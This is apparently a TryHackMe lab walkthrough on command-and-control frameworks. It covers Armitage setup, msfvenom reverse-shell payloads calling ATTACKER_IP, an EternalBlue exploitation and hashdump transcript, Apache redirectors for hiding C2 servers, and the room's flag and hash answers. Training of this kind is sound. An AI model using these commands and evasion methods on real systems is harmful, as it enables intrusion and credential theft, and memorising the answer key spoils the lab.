Task 1 - Introduction
-------------------------------------

### Welcome to Intro to C2

The Command and Control (C2) Frameworks are an essential part of Red Teamers and Advanced Adveraries playbooks. This helps make it both easy to manage compromised devices and move laterally.

### Room Objectives

In this room, we will learn about Command and Control Frameworks in-depth to gain a better understanding of the following topics:

-   How a Command and Control Framework operates
-   The various components that you may use.
-   How to set up a basic Command and Control Framework
-   Use Armitage **or** Metasploit to gain familiarity with a Command and Control Framework
-   How to administer a Command and Control Framework
-   OPSEC Considerations while administering a Command and Control Framework
-   And much more!

### Room Prerequisites  

-   General experience with the Metasploit Framework, for more information, see the [Metasploit Module](https://tryhackme.com/module/metasploit).
-   General familiarity with Red Teaming; for more information, see the [Red Team Fundamentals](https://tryhackme.com/room/redteamfundamentals) room.
-   General familiarity with exploiting vulnerable virtual machines.

__Questions__

Read the task above!
Answer: _None Needed_


Task 2 - Command and Control Framework Structure
----------------------------------------------------------------------------------

### What is a C2 Framework

In the simple form C2 Framework could be a netcat listener (server) handling callbacks from reverse shells (c2 agent). More robust frameworks like Metasploit have their own payload generator like MSFVenom. 

Real C2 Frameworks have robust tools for "Post Exploitation" that makes them more viable than a standard reverse shell.

### Command and Control Structure

**C2 Server**
The C2 Server acts as a hub for agents to call back into. Agents will typically try to contact the server and wait for commands.

**Agents/Payloads**
The agent is a program generated by the framework that calls back to a listner on the C2 Server. These agents typically have pseudo commands that allow them to simplify the operations for a hacker/operator. Things like uploading/downloading files etc. These agents are typically highly configurable.

**Listeners**
These run on the C2 server and wait for callback from an Agent

**Beacons**
A beacon is the process of a C2 Agent calling back to the listener.


### Obfuscating Agent Callbacks

**Sleep Timers** 

One key thing that some security analysts, anti-virus, and next-generation firewalls look for when attempting to identify Command and Control traffic is beaconing and the rate at which a device beacons out to a C2 server. Let’s say a firewall observed traffic that looks like so

-   TCP/443 - Session Duration 3s, 55 packets sent, 10:00:05.000
-   TCP/443 - Session Duration 2s, 33 packets sent, 10:00:10.000
-   TCP/443 - Session Duration 3s, 55 packets sent, 10:00:15.000
-   TCP/443 - Session Duration 1s, 33 packets sent, 10:00:20.000
-   TCP/443 - Session Duration 3s, 55 packets sent, 10:00:25.000

A pattern is starting to form. The agent beacons out every 5 seconds; this means that it has a sleep timer of 5 seconds.

**Jitter**

Jitter takes the sleep timer and adds some variation to it; our C2 beaconing may now exhibit a strange pattern that may show activity that is closer to an average user:

-   TCP/443 - Session Duration 3s, 55 packets sent, 10:00:03.580
-   TCP/443 - Session Duration 2s, 33 packets sent, 10:00:13.213
-   TCP/443 - Session Duration 3s, 55 packets sent, 10:00:14.912
-   TCP/443 - Session Duration 1s, 33 packets sent, 10:00:23.444
-   TCP/443 - Session Duration 3s, 55 packets sent, 10:00:27.182

The beaconing is set to an irregular pattern than makes it harder to id amoung regular user traffic. Some of the more advanced frameworks can even add things like "File" jitter or adding junk padding data to files to make them seem larger than they are.

**Sample Python Jitter Code**

`import random`

`sleep = 60`

`jitter = random.randint(-30,30)`

`sleep = sleep + jitter   `

### Payload Types

Much like a regular Reverse Shell, there are two primary types of payloads that you may be able to use in your C2 Framework; **Staged** and **Stageless** payloads.

**Stageless Payloads**

Stageless Payloads are the simplest of the two; they contain the full C2 agent and will call back to the C2 server and begin beaconing immediately. You can refer to the diagram below to gain a better understanding of how Stageless payloads operate.

![[redteam4.png]]


The steps for establishing C2 beaconing with a Stageless payload are as follows:

  

1. The Victim downloads and executes the Dropper  

2. The beaconing to the C2 Server begins

  

**Staged Payloads**

Staged payloads require a callback to the C2 server to download additional parts of the C2 agent. This is commonly referred to as a “Dropper” because it is “Dropped” onto the victim machine to download the second stage of our staged payload. This is a preferred method over stageless payloads because a small amount of code needs to be written to retrieve the additional parts of the C2 agent from the C2 server. It also makes it easier to obfuscate code to bypass Anti-Virus programs.

![[redteam5.png]]

The steps for establishing C2 beaconing with a Staged payload are as follows:

  

**1.** The Victim downloads and executes the Dropper  

**2.** The Dropper calls back to the C2 Server for Stage 2

**3.** The C2 Server sends Stage 2 back to the Victim Workstation

**4.** Stage 2 is loaded into memory on the Victim Workstation 

**5.** C2 Beaconing Initializes, and the Red Teamer/Threat Actors can engage with the Victim on the C2 Server.


### Payload Formats

As you may know, Windows PE files (Executables) are not the only way to execute code on a system. Some C2 Frameworks support payloads in various other formats, for example:

-   PowerShell Scripts
    -   Which may contain C# Code and may be compiled and executed with the Add-Type commandlet
-   HTA Files
-   JScript Files
-   Visual Basic Application/Scripts
-   Microsoft Office Documents

and many more. For more information on various other payload formats, you should review the [Weaponization](https://tryhackme.com/room/weaponization) room in the Initial Access module.

### Modules

Modules are a core component of any C2 Framework; they add the ability to make agents and the C2 server more flexible. Depending on the C2 Framework, scripts must be written in different languages. Cobalt Strike has “Aggressor Scripts”, which are written in the “Aggressor Scripting Language”. PowerShell Empire has support for multiple languages, Metasploit’s Modules are written in Ruby, and many others are written in many other languages.

### **Post Exploitation Modules**

Post Exploitation modules are simply modules that deal with anything after the initial point of compromise, this could be as simple as running SharpHound.ps1 to find paths of lateral movement, or it could be as complex as dumping LSASS and parsing credentials in memory. For more information on Post Exploitation, refer to the [Post Exploitation Basics](https://tryhackme.com/room/postexploit) room.

### **Pivoting Modules**

One of the last major components of a C2 Framework is its pivoting modules, making it easier to access restricted network segments within the C2 Framework. If you have Administrative Access on a system, you may be able to open up an “SMB Beacon”, which can enable a machine to act as a proxy via the SMB protocol. This may allow machines in a restricted network segment to communicate with your C2 server.

![[redteam6.png]]



The diagram above shows how hosts within a restricted network segment call back to the C2 Server:

  

1. The Victims call back to an SMB named pipe on another Victim in a non-restricted network segment.  

2. The Victim in the non-restricted network segment calls back to the C2 Server over a standard beacon.

3. The C2 Server then sends commands back to the Victim in the non-restricted network segment.

4. The Victim in the non-restricted network segment then forwards the C2 instructions to the hosts in the restricted segment.

  

### Facing the world 

One important obstacle that all Red Teamers must overcome is placing infrastructure in plain view. There are many different methods to do this; one of the most popular methods is called "Domain Fronting".

**Domain Fronting**

Domain Fronting utilizes a known, good host (for example) Cloudflare. Cloudflare runs a business that provides enhanced metrics on HTTP connection details as well as caching HTTP connection requests to save bandwidth.  Red Teamers can abuse this to make it appear that a workstation or server is communicating with a known, trusted IP Address. Geolocation results will show wherever the nearest Cloudflare server is, and the IP Address will show as ownership to Cloudflare

![[redteam7.png]]

The diagram above depicts how Domain Fronting works:

  

1. The C2 Operator has a domain that proxies all requests through Cloudflare.   

2. The Victim beacons out to the C2 Domain.

3. Cloudflare proxies the request, then looks at the Host header and relays the traffic to the correct server.

4. The C2 Server then responds to Cloudflare with the C2 Commands.

**5.** The Victim then receives the command from Cloudflare.

**C2 Profiles**

The next technique goes by several names by several different products, "NGINX Reverse Proxy", "Apache Mod_Proxy/Mod_Rewrite",  "Malleable HTTP C2 Profiles", and many others. However, they are all more or less the same. All of the Proxy features more or less allow a user to control specific elements of the incoming HTTP request. Let's say an incoming connection request has an "X-C2-Server" header; we could explicitly extract this header using the specific technology that is at your disposal (Reverse Proxy, Mod_Proxy/Rewrite, Malleable C2 Profile, etc.) and ensure that your C2 server responds with C2 based responses. Whereas if a normal user queried the HTTP Server, they might see a generic webpage. This is all dependent on your configuration.

![[redteam8.png]]

The diagram above depicts how C2 profiles work:

  

1. The Victim beacons out to the C2 Server with a custom header in the HTTP request, while a SOC Analyst has a normal HTTP Request  

2. The requests are proxied through Cloudflare

3. The C2 Server receives the request and looks for the custom header, and then evaluates how to respond based on the C2 Profile.

**4.** The C2 Server responds to the client and responds to the Analyst/Compromised device.

  

Because HTTPS requests are encrypted, extracting specific headers (ex: X-C2-Server, or Host) may be impossible. By using C2 Profiles, we may be able to hide our C2 server from the prying eyes of a Security Analyst. For more information on how C2 profiles can be powerful, see this blog post on [Understanding Malleable C2 Profiles for Cobalt Strike](https://blog.zsec.uk/cobalt-strike-profiles/).

In task 7, we will explain and explore another technique called "Redirectors". We will gain hands-on experience configuring Metasploit and Apache 2 to demonstrate how a redirector is set up.

__Questions__

What is the component's name that lives on the victim machine that calls back to the C2 server?
Answer: _Agent_

What is the beaconing option that introduces a random delay value to the sleep timer?
Answer: _Jitter_

What is the term for the first portion of a Staged payload?
Answer: _Dropper_

What is the name of the communication method that can potentially allow access to a restricted network segment that communicates via TCP ports 139 and 445?
Answer: _SMB Beacon_

Task 3 - Common C2 Frameworks
--------------------------------------------------------

Here we will discuss a free kinds of C2 Frameworks. There are many different kinds. Here we break them into 2 types:

* Free
* Paid

Premium/Paid C2 Frameworks are usually less likely to be detected by Anti-virus. The open source/free versions are open to everyone and generally much better understood and easier to test and build signatures against.

The paid versions have some advanced features that may also not be supported on free versions. For example Cobalt Strike has an option to open a VPN tunnel from a beacon. This is a great option if a proxy doesn't work well in a certain situation. 

### Free C2 Frameworks
**Metasploit**

This is one of the most popular exploitation and post exploitation frameworks that is available and installed on most penetration testing distros by default.

**Armitage**

This is an extention to Metasploit and adds a GUI, making it very similar to Cobalt Strike. Actually both were developed by Raphael Mudge.  It is a bit different though and even has some unique tools like the Hail Mary Attack which will try to run all exploits for services running on a target.

**Powershell Empire/Starkiller**

[Powershell Empire](https://bc-security.gitbook.io/empire-wiki/) and [Starkiller](https://github.com/BC-SECURITY/Starkiller) is another incredibly popular C2 originally created by Harmjoy, Sixdub, and Enigma0x3 from Veris Group. Currently, the project has been discontinued and has been picked up by the BC Security team (Cx01N, Hubbl3, and Vinnybod). Empire features agents written in various languages compatible with multiple platforms, making it an incredibly versatile C2. For more information on Empire, we recommend you take a look at the [Powershell Empire](https://tryhackme.com/room/rppsempire) room.

**Covenant**

[Covenant](https://github.com/cobbr/Covenant) by Ryan Cobb is the last free C2 Framework we will be covering - By far, it is one of the most unique C2 Frameworks being written in C#. Unlike Metasploit/Armitage, It’s primarily used for post-exploitation and lateral movement with HTTP, HTTPS, and SMB listeners with highly customizable agents.

**Sliver**

[Sliver](https://github.com/BishopFox/sliver) by [Bishop Fox](https://bishopfox.com/) is an advanced, highly customizable multi-user, CLI-based C2 framework. Sliver is written in Go, which makes reverse engineering the C2 "implants" incredibly difficult. It supports various protocols for C2 communications like WireGuard, mTLS, HTTP(S), DNS, and much more. Additionally, it supports BOF files for additional functionality, DNS Canary Domains for masking C2 communications, automatic Let's Encrypt certificate generation for HTTPS beacons, and much more.

### Paid C2 Frameworks

**Cobalt Strike**

[Cobalt Strike](https://www.cobaltstrike.com/) by Help Systems is probably the most popular paid C2 Framework. It was written by Raphael Mudge who did Armitage for Metasploit. 

**Brute Ratel**

[Brute Ratel](https://bruteratel.com/) by Chetan Nayak or Paranoid Ninja is a Command and Control framework marketed as a “Customizable Command and Control Center” or “C4” framework that provides a true adversary simulation-like experience with being a unique C2 framework.

### Other C2 Frameworks

For a more comprehensive list of C2 Frameworks and their capabilities, check out the “[C2 Matrix](https://howto.thec2matrix.com/)”, a project maintained by **Jorge Orchilles** and **Bryson Bort**. It has a far more comprehensive list of almost all C2 Frameworks that are currently available.

__Questions__

Learn about some common C2 Frameworks that are out in the wild!
Answer: _None Needed_


Task 4 - Setting Up a C2 Framework
-----------------------------------------------------------

### Lets Setup a C2 Server

In this task we will learn more about what it takes to setup a C2 Framework by installing Armitage. 

### Setting Up Armitage

Clone from Gitlab:

```
root@kali$ git clone https://gitlab.com/kalilinux/packages/armitage.git && cd armitage 
Cloning into 'armitage'... 
remote: Enumerating objects: 760, done. 
remote: Counting objects: 100% (160/160), done. 
remote: Compressing objects: 100% (100/100), done. 
remote: Total 760 (delta 55), reused 152 (delta 54), pack-reused 600 Receiving objects: 100% (760/760), 11.81 MiB | 8.55 MiB/s, done. Resolving deltas: 100% (244/244), done.
```

Next we need to build the current release; we can do so with the following command:

```bash
root@kali$ bash package.sh 
+ ./gradlew assemble 

> Task :armitage:compileJava 
Note: Some input files use or override a deprecated API. 
Note: Recompile with -Xlint:deprecation for details. 
Note: Some input files use unchecked or unsafe operations. 
Note: Recompile with -Xlint:unchecked for details. 

Deprecated Gradle features were used in this build, making it incompatible with Gradle 7.0. 
Use '--warning-mode all' to show the individual deprecation warnings. See https://docs.gradle.org/6.8/userguide/command_line_interface.html#sec:command_line_warnings 

BUILD SUCCESSFUL in 12s 
6 actionable tasks: 6 executed 
+ for i in unix windows mac 
+ '[' unix == mac ']' 
+ mkdir -p release/unix 
+ cp build.txt license.txt readme.txt whatsnew.txt release/unix 
+ cp build/armitage.jar build/cortana.jar release/unix 
+ cp -r dist/unix/armitage dist/unix/armitage-logo.png dist/unix/teamserver release/unix 
+ '[' unix == mac ']' 
+ for i in unix windows mac 
+ '[' windows == mac ']' 
+ mkdir -p release/windows 
+ cp build.txt license.txt readme.txt whatsnew.txt release/windows 
+ cp build/armitage.jar build/cortana.jar release/windows 
+ cp -r dist/windows/armitage.exe release/windows 
+ '[' windows == mac ']' 
+ for i in unix windows mac 
+ '[' mac == mac ']' 
+ ++ uname 
+ '[' Linux '!=' Darwin ']' 
+ echo 'Skipping macOS build because this is not running on Darwin' Skipping macOS build because this is not running on Darwin

```

Once complete, the release build will be in the ./releases/unix/ folder. We can then verify it:

```bash
root@kali$ cd ./release/unix/ && ls -la 
total 11000 
drwxr-xr-x 2 root root 4096 Feb 6 20:20 . 
drwxr-xr-x 4 root root 4096 Feb 6 20:20 .. 
-rwxr-xr-x 1 root root 75 Feb 6 20:20 armitage 
-rw-r--r-- 1 root root 4334705 Feb 6 20:20 armitage.jar 
-rw-r--r-- 1 root root 25985 Feb 6 20:20 armitage-logo.png 
-rw-r--r-- 1 root root 282 Feb 6 20:20 build.txt 
-rw-r--r-- 1 root root 6778470 Feb 6 20:20 cortana.jar 
-rw-r--r-- 1 root root 1491 Feb 6 20:20 license.txt 
-rw-r--r-- 1 root root 4385 Feb 6 20:20 readme.txt 
-rwxr-xr-x 1 root root 2665 Feb 6 20:20 teamserver 
-rw-r--r-- 1 root root 85945 Feb 6 20:20 whatsnew.txt
```

There are 2 key files we will use from here:

**Teamserver -**
This is the file that will start the Armitage server that multiple users will be able to connect to. This file takes two arguments:

-   IP Address
    

Your fellow Red Team Operators will use the IP Address to connect to your Armitage server.  

-    Shared Password

Your fellow Red Team Operators will use the Shared Password to access your Armitage server.

**Armitage -**
This is the file you will use to connect to the Armitage TeamServer. You should see something like this:
![[c2ops-1.png]]
NOTE: The User should be some nickname rather than some real username.

### Preparing our Environment

Before we start, we should do a few checks to make sure Metasploit is configured since Armitage relies on that for functionality. We need to initialize the DB before we launch Armitage.

```bash
root@kali$ systemctl start postgresql && systemctl status postgresql postgresql.service - PostgreSQL RDBMS 
	Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor preset: enabled) 
	Active: active (exited) since Sun 2022-02-06 20:16:03 GMT; 41min ago Process: 1587 ExecStart=/bin/true (code=exited, status=0/SUCCESS) 
Main PID: 1587 (code=exited, status=0/SUCCESS) 

Feb 06 20:16:03 ip-10-10-142-239 systemd[1]: Starting PostgreSQL RDBMS... 
Feb 06 20:16:03 ip-10-10-142-239 systemd[1]: Started PostgreSQL RDBMS.
```

Next initialize the database. We cannot be root!

```bash
user@kali$ msfdb --use-defaults delete 
Stopping database at /home/ubuntu/.msf4/db 
Deleting all data at /home/ubuntu/.msf4/db 
MSF web service is no longer running 

user@kali$ msfdb --use-defaults init 
Creating database at /home/ubuntu/.msf4/db 
Starting database at /home/ubuntu/.msf4/db...success 
Creating database users 
Writing client authentication configuration file /home/ubuntu/.msf4/db/pg_hba.conf 
Stopping database at /home/ubuntu/.msf4/db 
Starting database at /home/ubuntu/.msf4/db...success 
Creating initial database schema 
Generating SSL key and certificate for MSF web service 
Attempting to start MSF web service...failed 
[!] MSF web service does not appear to be started. 
Please see /home/ubuntu/.msf4/logs/msf-ws.log for additional details.
```

After this we can finally start Armitage Team Server.

### Starting and Connecting to Armitage

```bash
root@kali$ cd /opt/armitage/release/unix && ./teamserver YourIP P@ssw0rd123 
[*] Generating X509 certificate and keystore (for SSL) 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true 
[*] Starting RPC daemon 
[*] MSGRPC starting on 127.0.0.1:55554 (NO SSL):Msg... 
[*] MSGRPC backgrounding at 2022-02-06 17:47:08 -0500... 
[*] MSGRPC background PID 2083 
[*] sleeping for 20s (to let msfrpcd initialize) 
[*] Starting Armitage team server Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true 
[*] Use the following connection details to connect your clients: 
	Host: 127.0.0.2 
	Port: 55553 
	User: msf 
	Pass: P@ssw0rd123 
	
[*] Fingerprint (check for this string when you connect): d211e51c8886113433f63b588fd5ccfc9e323059 
[+] hacking is such a lonely thing, until now
```

Once the Teamserver is up and running we can start the Amitage client.

```bash
root@kali$ cd /opt/armitage/release/unix && ./armitage 
[*] Used the incumbent: 10.10.69.193 
[*] Starting Cortana on 10.10.69.193 
[*] Starting Cortana on 10.10.69.193 
[*] Creating a default reverse handler... 0.0.0.0:8836
```

Be careful to only expose the Armitage management interface on a local interface rather than external. We don't want others connecting from outside. 

If we have other team members outside of the box that want to connect, we should create a seperate user for them and enable SSH access, so they could do SSH port forward TCP/55553. Amitage denies users listening on 127.0.0.1, please use tun0 or ethX IP address.

![[c2ops-2.png]]

After you Connect, we will be prompted to use a Nickname. 

After a few seconds the Armitage UI should open up. It will look empty like this until we start connecting to remote systems. In the next tasks we will be connecting to vulnerable web machine to get used to the UI.

![[c2ops-3.png]]

__Questions__
Read the task, set up Armitage, and explore the User Interface.

Answer: _None Needed_

Task 5 - C2 Operation Basics
-------------------------------------------------

### Accessing and Managing your C2 Infrastructure

Now that everything is setup we will cover some operational details.

**Basic Operational Security**

Don't have your C2 Management Interface directly accessible. It can be easy to fingerprint C2 services publically available. For example Cobalt Strike versions prior to 3.13 could be easily id'd by examining the http response and seeing an extra (\x20) space at the end. Blue Teams could then map the entire internet to find all of them. For more info  check out this posted on the [Recorded Future blog](https://www.recordedfuture.com/cobalt-strike-servers/).

**Accessing your Remote C2 Server that's Listening Locally**

This will involve port forwarding. We can either host resources on a remote machine by forwarding a local port to the remote server, or allows us to access local resources on the remote machine we are connecting to.

![[c2ops-4.png]]

Example 2:

![[c2ops-5.png]]

From Task 4, our Teamserver is listening on TCP/55553. In order to access this, we need to setup a local port-forward to forward our local port to the remote Teamserver server. This is accomplished with the -L flag of the SSH command.

```bash
root@kali$ ssh -L 55553:127.0.0.1:55553 root@192.168.0.44 
root@kali$ echo "Connected" 
Connected
```

Now you could connect to your C2 server normally on TCP/55553. Remember that Armitage does **not** support listening on a loopback itnerface (127.0.0.1-127.255.255.255).

If it is required that you make your C2 server listen on a public interface, it is highly recommended you have firewall rules in place so that only the intented users can access it.

**Creating a Listener in Armitage**

Now we will create a listener. In this case we make a basic Meterpreter Listener running on TCP/31337.  To start, click the Armitage dropdown and then click Listeners and pick your type. In this case we use a standard "Reverse" Listener.

![[c2ops-6.png]]

After choosing the Reverse type, a new sub-menu will open prompting you for some additional options like:
* Port - Choose a port
* Type - Shell (standard netcat style) or Meterpreter

![[c2ops-7.png]]

After your selection and starting the listener, a new pane will pop up showing a standard looking Metasploit exploit/multi/handler module.

![[c2ops-8.png]]

After setting up the listener, we can use MSFvenom t generate a standard windows/meterpreter/reverse_tcp shell and set the LHOST to the Armitage server.

**Getting a Callback**

```bash
root@kali$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe -o shell.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 
[-] No arch selected, selecting arch: x86 from the payload 
No encoder specified, outputting raw payload 
Payload size: 354 bytes 
Final size of exe file: 73802 bytes 
Saved as: shell.exe
```

After creating and transfering the payload to the target and executing it, we should see a callback.

![[c2ops-9.png]]

### Listener Type

There are many types of Listeners. We will cover some popular ones here.

**Standard Listener -** 

These often communicate directly over a raw TCP or UDP socket, sending commands in cleartext. Metasploit has full support for generic listeners.

**HTTP/HTTPS Listeners -** 

These often front as some sort of Web Server and use techniques like Domain Fronting or Malleable C2 profiles to mask a C2 server. When specifically communicating over HTTPS, it's less likely for communications to be blocked by an NGFW. Metasploit has full support for HTTP/HTTPS listeners.

**DNS Listener -**

DNS Listeners are a popular technique specifically used in the exfiltration stage where additional infrastructure is normally required to be set up, or at the very least, a Domain Name must be purchased and registered, and a public NS server must be configured. It is possible to set up DNS C2 operations in Metasploit with the help of additional tools. For more information, see this "[Meterpreter over DNS](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf)" presentation by Alexey Sintsov and Maxim Andreyanov. These are often very useful for bypassing Network Proxies.

**SMB Listener -** 

Communicating via SMB named pipes is a popular method of choice, especially when dealing with a restricted network; it often enables more flexible pivoting with multiple devices talking to each other and only one device reaching back out over a more common protocol like HTTP/HTTPS. Metasploit has support for Named Pipes.

__Questions__

Which listener should you choose if you have a device that cannot easily access the internet?
Answer: _DNS_

Which listener should you choose if you're accessing a restricted network segment?
Answer: _SMB_

Which listener should you choose if you are dealing with a Firewall that does protocol inspection?
Answer: _HTTPS_

Task 6 - Command, Control, and Conquer
--------------------------------------------------------------------

In this task we will launch the vulnerable machine which is a win7 and it is vulnerable with the MS17-010 EternalBlue attack.

First thing we do is an nmap scan:

![[armitage4.png]]

We can put in the IP address of the host we are looking to scan. You can grab the IP from our task window after the VM has been started.

Next we want to open the Exploits and search for Windows dropdown, then SMB dropdown and then you should see ms17_010_eternalblue as below:

![[armitage1.jpg]]

You get something like this. It **should** populate the correct LHOST and etc, but for mine I had to manually set the RHOST for some reason.

![[armitage6.png]]

Then just click launch.

After a few mins you will have exploited the box. You can then right click on it to run the Interact or Meterpreter shell.

To get the user flags use Interact and it opens  a standard windows shell so you can navigate to C:\Users\Administrator\Desktop\ and also C:\Users\Ted\Desktop to see the flags.

![[armitage2.jpg]]

![[armitage3.jpg]]

You will need to open a Meterpreter session for the hashes.  If you are experiencing issues while running the windows/gather/hashdump module, ensure you are running the module from a Meterpreter session and not a standard "Command" session.

![[amitage5.png]]

Here is how to do it the standard way:

```bash
root@attackbox$ msfconsole -q 
msf5 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp 
msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST eth0 
LHOST => eth0 
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOST VICTIM_IP RHOST => VICTIM_IP 
msf5 exploit(windows/smb/ms17_010_eternalblue) > run 

[*] Started reverse TCP handler on ATTACKER_IP:4444 
[*] VICTIM_IP:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] VICTIM_IP:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit) 
[*] VICTIM_IP:445 - Scanned 1 of 1 hosts (100% complete) 
[*] VICTIM_IP:445 - Connecting to target for exploitation. 
[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

Now that we have exploited the Virtual Machine and have achieved System level access, we can use the hashdump command to retrieve the users NTLM hashes:

```bash
meterpreter > hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:c156d5d<snip!>4d6e0943c::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae93<snip!>d7e0c089c0::: Ted:1001:aad3b435b51404eeaad3b435b51404ee:2e2618f266da8867<snip!>5c1309a5c::: 
meterpreter >
```

All that is left is to now retrieve the flags in the user's Home folders:

```bash
meterpreter > cat C:/Users/Administrator/Desktop/root.txt THM{bd6ea6c87<snip!>21081132744} 
meterpreter > cat C:/Users/Ted/Desktop/user.txt THM{217fa45e3<snip!>fc0be28e760}
```

If you would like to use Armitage, use this [guide that shows step-by-step](https://drive.google.com/file/d/1u-YmWl7cx3tO2vVjon0EtOGLXVCak2SJ/view?usp=sharing) instructions.


__Questions__

What flag can be found after gaining Administrative access to the PC?
Answer: _THM{bd6ea6c871dced619876321081132744}_

What is the Administrator's NTLM hash?
Answer: _c156d5d108721c5626a6a054d6e0943c_

What flag can be found after gaining access to Ted's user account?
Answer: _THM{217fa45e35f8353ffd04cfc0be28e760}_

What is Ted's NTLM Hash?
Answer: _2e2618f266da8867e5664425c1309a5c_


Task 7 - Advanced C2 Setups
----------------------------------------------------

### There's Always Room For Improvement

Metasploit is good but it has it's downfalls. You can't configure it to beacon out every x seconds with y jitter. Besides, connecting to HTTP/S listener would quickly show what is going on.

### Command and Control Redirectors

**What is a Redirector?**

A redirector is basically what it seems. It is similar to a modern load balancer that redirects traffic for HTTP/S based on conditions. It normally runs on Apache or NGINX. In this Task we'll use Apache.

In Metasploit, we'll set it up with a more advanced configuration using the Redirector. Usually you'd set this up on Multiple hosts. In this example we'll do one. The purpose however is to hide the true Command and Control Serer.


![[c2redirector-1.png]]

**How is a Redirector Setup?**

We basically will setup Apache with some specific modules that will allow us to rewrite traffic flows based on certain patterns. The modules we'll need are:

* rewrite
* proxy
* proxy_http
* headers

```bash
root@kali$ apt install apache2
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  python-bs4 python-chardet python-dicttoxml python-dnspython python-html5lib
  python-jsonrpclib python-lxml python-mechanize python-olefile python-pypdf2
  python-slowaes python-webencodings python-xlsxwriter
Use 'apt autoremove' to remove them.
The following additional packages will be installed:
  apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
  libaprutil1-ldap
Suggested packages:
  apache2-doc apache2-suexec-pristine | apache2-suexec-custom
The following NEW packages will be installed
  apache2 apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
  libaprutil1-ldap
0 to upgrade, 6 to newly install, 0 to remove and 416 not to upgrade.

Processing triggers for systemd (237-3ubuntu10.42) ...
Processing triggers for man-db (2.8.3-2ubuntu0.1) ...
Processing triggers for ufw (0.36-0ubuntu0.18.04.1) ...
Processing triggers for ureadahead (0.100.0-21) ...

root@kali$ a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
Enabling module rewrite.
To activate the new configuration, you need to run:
  systemctl restart apache2
Enabling module proxy.
To activate the new configuration, you need to run:
  systemctl restart apache2
Enabling module proxy_http.
To activate the new configuration, you need to run:
  systemctl restart apache2
Enabling module headers.
To activate the new configuration, you need to run:
  systemctl restart apache2

● apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
     Active: active (running) since Thu 2022-02-10 23:17:08 EST; 7ms ago
       Docs: https://httpd.apache.org/docs/2.4/
    Process: 4149 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
   Main PID: 4153 (apache2)
      Tasks: 1 (limit: 19072)
           Memory: 6.0M
        CPU: 19ms
     CGroup: /system.slice/apache2.service
             └─4153 /usr/sbin/apache2 -k start
```

Using Meterpreter we have the ability to configure various aspects of the HTTP request such as the User-Agent. We need to do this so a security agent doesn't spot our Meterpreter. For this demonstration, we will generate a Meterpreter Reverse HTTP payload using MSFvenom; then we will inspect the HTTP request in Wireshark. 

**Generating a Payload with Modified Headers -**

```bash
root@kali$ msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 454 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

After generating the modified executable and transferring it to a victim, open up Wireshark on your host and use the HTTP filter to only view HTTP requests. After it's started capturing packets, execute the binary on the victim system. You will notice an HTTP request come in with our modified User-Agent.

![[c2redirector-2.png]]

Now that we have a field we can control in the HTTP Request, let's create an Apache2 mod_rewrite rule that filters on the user agent "NotMeterpreter" and forward it to our Metasploit C2 Server.

**Modifying the Apache Config File-**

This section may sound intimidating but is actually quite easy; we will be taking the default Apache config and modifying it to our advantage. On Debian based systems, the default config can be found at /etc/apache2/sites-available/000-default.conf

```bash
root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
<VirtualHost *:80>

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        <Directory>
                AllowOverride All
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

Now we just need to add a few lines to the Apache2 config file and turn on the RewriteEngine.

We just need to add `RewriteEngine On` to the VirtualHost section.

Now we use the engine to target our User-Agent "NotMeterpreter", We will use some basic RegEx. 
"^NotMeterpreter$"

The ^ is for beginning of the Line starts with..

The $ marks end of the line.

So our Rewrite condition becomes:
`RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"`

Last we need to forward the request through Apache2, through our proxy, to Metasploit.  We can use the ProxyPass feature of mod_proxy module for this.  We just need to put the base URL "/", and the target where we want to forward the request to.  In our example this will be localhost and the port our Metasploit listens on.

```bash
root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'

<VirtualHost *:80>

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	RewriteEngine On
	RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
	ProxyPass "/" "http://localhost:8080/"

	<Directory>
		AllowOverride All
	</Directory>

